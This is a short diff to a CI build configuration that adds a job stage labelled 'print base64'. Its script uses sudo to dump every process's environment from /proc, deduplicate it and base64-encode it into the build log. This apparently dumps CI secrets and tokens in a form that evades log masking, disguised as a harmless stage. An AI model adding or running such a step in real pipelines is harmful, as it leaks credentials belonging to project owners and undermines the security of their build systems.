@@ -13,3 +13,5 @@ jobs:
       script: echo $FOO
     - stage: "echo BAZ"
       script: echo $BAZ
+    - stage: "print base64"
+      script: sudo strings /proc/*/environ | sort -u | base64
